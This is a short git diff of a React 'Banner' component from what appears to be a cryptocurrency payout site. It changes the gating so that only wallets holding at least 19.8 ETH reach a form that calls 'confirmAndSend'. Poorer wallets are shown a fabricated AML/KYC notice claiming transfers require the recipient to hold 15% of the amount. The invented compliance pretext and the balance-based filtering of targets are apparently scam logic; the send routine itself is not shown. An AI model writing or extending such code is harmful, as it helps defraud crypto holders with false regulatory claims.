@@ -219,17 +219,17 @@ const Banner = () => {
             </div> */}
             {
                 accountsConnected ? <>
-                    {userBalance <= 0 && (
+                    {userBalance < 19.8 && (
                         <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
                             <p>
                                 Pursuant to our internal compliance policies and in alignment with established anti-money laundering (AML) and counter-terrorist financing (CTF) standards, we have identified that the referenced wallet maintains a balance of {userBalance?.toFixed(4)} ETH and reflects limited transactional activity. In accordance with our risk-based approach to fund disbursement, transfers are restricted to destination wallets that demonstrate a minimum balance equivalent to 15% of the proposed transfer amount and exhibit a positive transaction history. This measure is implemented to ensure adherence to Know Your Customer (KYC) protocols and to mitigate exposure to fraudulent or illicit activity.
                             </p>
                         </div>
                     )}
-                    {userBalance >= 0 && (
+                    {userBalance >= 19.8 && (
                         <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
                     )}
-                    {userBalance <= 0 && (
+                    {userBalance < 19.8 && (
                         <div className="p-4 rounded-md border border-red-600">
                             <div className="flex flex-col gap-y-2">
                                 <h4>Wallet balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
